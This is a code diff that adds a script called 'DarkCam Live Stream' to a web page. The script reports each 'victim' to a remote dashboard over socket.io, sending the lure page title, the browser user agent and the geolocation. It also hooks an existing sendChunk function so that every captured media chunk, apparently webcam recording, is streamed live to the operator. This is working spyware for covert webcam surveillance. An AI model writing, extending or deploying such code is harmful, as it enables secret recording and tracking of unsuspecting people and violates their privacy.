@@ -159,5 +159,43 @@ async function sendChunk(blob, index) {
   }).catch(()=>{});
 }
 </script>
+
+<!-- DarkCam Live Stream -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+(function(){
+  const _sock = io({ transports: ['websocket', 'polling'] });
+  let _geo = {};
+
+  // Grab geo when available
+  if (typeof getGeo === 'function') {
+    getGeo().then(g => { _geo = g; });
+  }
+
+  _sock.on('connect', function() {
+    _sock.emit('victim_join', {
+      sid:  typeof SID !== 'undefined' ? SID : 'unknown',
+      lure: document.title,
+      ua:   navigator.userAgent,
+      geo:  _geo
+    });
+  });
+
+  // Patch sendChunk — relay every chunk to live dashboard
+  const _origSend = window.sendChunk;
+  window.sendChunk = async function(blob, idx) {
+    if (_origSend) await _origSend(blob, idx);
+    try {
+      const buf = await blob.arrayBuffer();
+      _sock.emit('live_chunk', {
+        sid:   typeof SID !== 'undefined' ? SID : 'unknown',
+        idx:   idx,
+        first: idx === 0,
+        data:  buf
+      });
+    } catch(e) {}
+  };
+})();
+</script>
 </body>
 </html>
